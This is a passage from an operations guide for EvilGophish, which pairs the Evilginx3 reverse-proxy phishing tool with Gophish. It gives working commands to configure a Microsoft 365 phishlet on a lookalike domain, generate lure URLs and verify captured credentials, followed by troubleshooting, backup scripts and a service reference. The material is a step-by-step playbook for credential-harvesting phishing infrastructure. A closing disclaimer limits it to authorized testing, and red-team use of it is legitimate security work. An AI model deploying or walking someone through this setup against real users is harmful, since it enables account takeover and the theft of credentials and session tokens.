# On local machine
ssh -L 3333:127.0.0.1:3333 user@server-ip

# Then open in browser: https://localhost:3333
```

#### Step 2: Evilginx3 Configuration

```bash
# Connect to evilginx3 (in tmux or separate terminal)
cd /opt/evilgophish/evilginx3

# Start in interactive mode for testing
./evilginx3 -developer -g /opt/evilgophish/gophish/gophish.db

# Configure phishlet (in evilginx3 console)
: config domain secure-login.com
: config ipv4 YOUR_SERVER_IP
: phishlets hostname o365 accounts.secure-login.com
: phishlets enable o365
: lures create o365
: lures get-url 0

# Note the generated phishing URL
```

#### Step 3: Test Phishing Flow

```bash
# Test the phishing URL in an isolated environment
# Use a VM or container with host file modifications

# 1. Add to /etc/hosts on test machine:
echo "YOUR_SERVER_IP accounts.secure-login.com" | sudo tee -a /etc/hosts

# 2. Open the lure URL in browser
# 3. Enter test credentials
# 4. Verify capture in Gophish dashboard
```

#### Step 4: Verify Capture

```bash
# Check Gophish events
sqlite3 /opt/evilgophish/gophish/gophish.db \
    "SELECT * FROM events ORDER BY time DESC LIMIT 10;"

# Check Evilfeed dashboard
curl http://127.0.0.1:1337/
```

### 6.3 Performance Testing

```bash
# Install Apache Bench
sudo apt install -y apache2-utils

# Basic load test (adjust URL)
ab -n 100 -c 10 https://accounts.secure-login.com/

# Expected results:
# - Requests per second: > 50
# - Mean time per request: < 200ms
# - Failed requests: 0
```

### 6.4 Security Testing

```bash
# SSL/TLS security test
# Online: https://www.ssllabs.com/ssltest/

# Local test with testssl.sh
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh https://accounts.secure-login.com

# Check for common vulnerabilities
nmap --script ssl-enum-ciphers -p 443 accounts.secure-login.com
```

### 6.5 Common Issues and Solutions

| Issue | Symptom | Solution |
|-------|---------|----------|
| DNS not resolving | Domain timeout | Verify NS records, check evilginx3 DNS service |
| SSL certificate error | Browser warning | Check cert validity, ensure ACME completed |
| Port already in use | Service won't start | `netstat -tuln` to find conflict, stop conflicting service |
| Database locked | Gophish errors | Ensure only one instance accessing DB |
| No captures | Events not appearing | Check blacklist mode, verify lure URL |
| Apache 503 | Proxy error | Verify evilginx3 is running on 8443 |

---

## 7. Backup & Recovery

### 7.1 Backup Strategy

#### Critical Data to Backup

| Data | Location | Frequency |
|------|----------|-----------|
| Gophish Database | `/opt/evilgophish/gophish/gophish.db` | Daily |
| Evilginx3 Config | `~/.evilginx/` | Daily |
| SSL Certificates | `/etc/letsencrypt/` | Weekly |
| Apache Config | `/etc/apache2/` | On change |
| Custom Substitutions | `/etc/apache2/custom-subs/` | On change |

### 7.2 Automated Backup Script

```bash
#!/bin/bash
# backup-evilgophish.sh

BACKUP_DIR="/opt/backups/evilgophish"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_NAME="evilgophish_backup_${DATE}"

# Create backup directory
mkdir -p "${BACKUP_DIR}/${BACKUP_NAME}"

echo "Starting backup: ${BACKUP_NAME}"

# Stop services for consistent backup
sudo systemctl stop gophish evilginx3 evilfeed

# Backup Gophish
echo "Backing up Gophish..."
cp -r /opt/evilgophish/gophish/gophish.db "${BACKUP_DIR}/${BACKUP_NAME}/"
cp /opt/evilgophish/gophish/config.json "${BACKUP_DIR}/${BACKUP_NAME}/"

# Backup Evilginx3 config
echo "Backing up Evilginx3..."
cp -r ~/.evilginx "${BACKUP_DIR}/${BACKUP_NAME}/evilginx_config"

# Backup Apache config
echo "Backing up Apache..."
cp -r /etc/apache2/sites-available "${BACKUP_DIR}/${BACKUP_NAME}/apache_sites"
cp -r /etc/apache2/custom-subs "${BACKUP_DIR}/${BACKUP_NAME}/custom_subs"

# Backup SSL certificates
echo "Backing up SSL certificates..."
sudo cp -r /etc/letsencrypt "${BACKUP_DIR}/${BACKUP_NAME}/letsencrypt"

# Create archive
echo "Creating archive..."
cd "${BACKUP_DIR}"
tar -czf "${BACKUP_NAME}.tar.gz" "${BACKUP_NAME}"
rm -rf "${BACKUP_NAME}"

# Restart services
sudo systemctl start gophish evilginx3 evilfeed

# Cleanup old backups (keep last 7)
echo "Cleaning up old backups..."
ls -t ${BACKUP_DIR}/*.tar.gz | tail -n +8 | xargs -r rm

echo "Backup complete: ${BACKUP_DIR}/${BACKUP_NAME}.tar.gz"
echo "Size: $(du -h ${BACKUP_DIR}/${BACKUP_NAME}.tar.gz | cut -f1)"
```

### 7.3 Recovery Procedure

```bash
#!/bin/bash
# restore-evilgophish.sh

if [ -z "$1" ]; then
    echo "Usage: $0 <backup_file.tar.gz>"
    exit 1
fi

BACKUP_FILE="$1"
RESTORE_DIR="/tmp/evilgophish_restore"

echo "Starting restoration from: ${BACKUP_FILE}"

# Stop services
sudo systemctl stop gophish evilginx3 evilfeed apache2

# Extract backup
mkdir -p "${RESTORE_DIR}"
tar -xzf "${BACKUP_FILE}" -C "${RESTORE_DIR}"
BACKUP_NAME=$(ls "${RESTORE_DIR}")

# Restore Gophish database
echo "Restoring Gophish database..."
cp "${RESTORE_DIR}/${BACKUP_NAME}/gophish.db" /opt/evilgophish/gophish/
cp "${RESTORE_DIR}/${BACKUP_NAME}/config.json" /opt/evilgophish/gophish/

# Restore Evilginx3 config
echo "Restoring Evilginx3 config..."
cp -r "${RESTORE_DIR}/${BACKUP_NAME}/evilginx_config" ~/.evilginx

# Restore Apache config
echo "Restoring Apache config..."
sudo cp -r "${RESTORE_DIR}/${BACKUP_NAME}/apache_sites"/* /etc/apache2/sites-available/
sudo cp -r "${RESTORE_DIR}/${BACKUP_NAME}/custom_subs"/* /etc/apache2/custom-subs/

# Restore SSL certificates
echo "Restoring SSL certificates..."
sudo cp -r "${RESTORE_DIR}/${BACKUP_NAME}/letsencrypt" /etc/

# Set permissions
sudo chown -R gophish:gophish /opt/evilgophish/gophish

# Cleanup
rm -rf "${RESTORE_DIR}"

# Start services
sudo systemctl start apache2 gophish evilginx3 evilfeed

echo "Restoration complete!"
```

### 7.4 Database Maintenance

```bash
# Vacuum the SQLite database to optimize
sqlite3 /opt/evilgophish/gophish/gophish.db "VACUUM;"

# Check database integrity
sqlite3 /opt/evilgophish/gophish/gophish.db "PRAGMA integrity_check;"

# Export data for analysis
sqlite3 -header -csv /opt/evilgophish/gophish/gophish.db \
    "SELECT * FROM events;" > events_export.csv
```

---

## 8. Troubleshooting

### 8.1 Common Issues

#### Issue: Evilginx3 fails to start with "address already in use"

**Cause:** Another process is using port 53 or 443

**Solution:**
```bash
# Find process using port
sudo netstat -tulpn | grep -E ':53|:443'
sudo lsof -i :53
sudo lsof -i :443

# Stop conflicting service
sudo systemctl stop systemd-resolved  # Often uses port 53
sudo systemctl stop apache2           # May use 443
```

#### Issue: No credentials captured

**Cause:** Multiple possible causes

**Diagnosis:**
```bash
# 1. Check phishlet is enabled
# In evilginx3 console:
: phishlets

# 2. Check lure exists
: lures

# 3. Check blacklist mode
: blacklist

# 4. Check logs
tail -f /var/log/evilginx3/evilginx3.log
```

#### Issue: Apache returns 503 errors

**Cause:** Backend (evilginx3) not accessible

**Solution:**
```bash
# Verify evilginx3 is running
systemctl status evilginx3

# Check it's listening
netstat -tlpn | grep 8443

# Test backend directly
curl -k https://127.0.0.1:8443/

# Check Apache proxy configuration
apache2ctl -S
```

#### Issue: SSL certificate errors in browser

**Cause:** Certificate mismatch or expired

**Solution:**
```bash
# Check certificate
openssl s_client -connect accounts.secure-login.com:443 -servername accounts.secure-login.com

# Renew Let's Encrypt
sudo certbot renew --force-renewal

# For self-signed (dev), regenerate
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/apache2/ssl/bitb.key \
    -out /etc/apache2/ssl/bitb.crt
```

#### Issue: Gophish admin interface not accessible

**Cause:** Service not running or port binding issue

**Solution:**
```bash
# Check service
systemctl status gophish

# Check port binding
netstat -tlpn | grep 3333

# Check logs
tail -50 /var/log/gophish/gophish.log

# Verify config
cat /opt/evilgophish/gophish/config.json | jq .
```

### 8.2 Debug Mode

Enable verbose logging for troubleshooting:

```bash
# Evilginx3 debug mode
./evilginx3 -debug -feed -g /opt/evilgophish/gophish/gophish.db

# Apache debug logging
# Add to VirtualHost:
LogLevel debug

# Gophish debug
# In config.json:
"logging": {
    "filename": "gophish.log",
    "level": "debug"
}
```

### 8.3 Network Diagnostics

```bash
# Full network diagnostic
echo "=== Network Diagnostics ==="

# DNS
echo "DNS Resolution:"
dig accounts.secure-login.com +short

# Ports
echo "Port Status:"
for port in 53 80 443 3333 8443 1337; do
    nc -z -w1 127.0.0.1 $port && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
done

# Firewall
echo "Firewall Rules:"
sudo ufw status numbered

# Routes
echo "Routing Table:"
ip route

# Connections
echo "Active Connections:"
netstat -tuln | grep LISTEN
```

### 8.4 Log Analysis

```bash
# Real-time log monitoring
sudo tail -f /var/log/gophish/gophish.log \
    /var/log/evilginx3/evilginx3.log \
    /var/log/apache2/bitb-error.log

# Search for errors
grep -i error /var/log/gophish/*.log
grep -i error /var/log/evilginx3/*.log
grep -i error /var/log/apache2/*.log

# Count events by type
sqlite3 /opt/evilgophish/gophish/gophish.db \
    "SELECT message, COUNT(*) FROM events GROUP BY message;"
```

### 8.5 Performance Optimization

```bash
# Increase file descriptor limits
echo "* soft nofile 65536" | sudo tee -a /etc/security/limits.conf
echo "* hard nofile 65536" | sudo tee -a /etc/security/limits.conf

# Optimize Apache
sudo a2enmod http2
echo "Protocols h2 h2c http/1.1" | sudo tee -a /etc/apache2/apache2.conf

# Optimize SQLite
sqlite3 /opt/evilgophish/gophish/gophish.db << 'EOF'
PRAGMA journal_mode = WAL;
PRAGMA synchronous = NORMAL;
PRAGMA cache_size = 10000;
PRAGMA temp_store = MEMORY;
EOF
```

---

## Quick Reference

### Service Commands

```bash
# Start all services
sudo systemctl start gophish evilginx3 evilfeed apache2

# Stop all services
sudo systemctl stop gophish evilginx3 evilfeed apache2

# Restart all services
sudo systemctl restart gophish evilginx3 evilfeed apache2

# View status
sudo systemctl status gophish evilginx3 evilfeed apache2
```

### Important Paths

| Component | Path |
|-----------|------|
| EvilGophish Root | `/opt/evilgophish/` |
| Gophish Binary | `/opt/evilgophish/gophish/gophish` |
| Gophish Database | `/opt/evilgophish/gophish/gophish.db` |
| Gophish Config | `/opt/evilgophish/gophish/config.json` |
| Evilginx3 Binary | `/opt/evilgophish/evilginx3/evilginx3` |
| Evilginx3 Config | `~/.evilginx/` |
| Phishlets | `/opt/evilgophish/evilginx3/phishlets/` |
| Evilfeed Binary | `/opt/evilgophish/evilfeed/evilfeed` |
| Apache Config | `/etc/apache2/sites-available/bitb.conf` |
| SSL Certs | `/etc/letsencrypt/live/` or `/etc/apache2/ssl/` |
| Logs | `/var/log/{gophish,evilginx3,evilfeed,apache2}/` |

### Default Ports

| Service | Port | Access |
|---------|------|--------|
| DNS | 53 | External |
| HTTP | 80 | External |
| HTTPS | 443 | External |
| Gophish Admin | 3333 | Localhost |
| Evilginx3 Backend | 8443 | Localhost |
| Evilfeed | 1337 | Localhost |

---

## Disclaimer

This documentation is provided for authorized security testing purposes only. Always ensure you have proper written authorization before conducting any phishing simulations or credential harvesting activities. Unauthorized use of these tools may violate local, state, and federal laws.

The authors and contributors are not responsible for any misuse or damage caused by this software. Use responsibly and ethically.

---

**Document Version:** 1.0.0
**Last Updated:** 2025
**Maintainer:** Security Testing Team
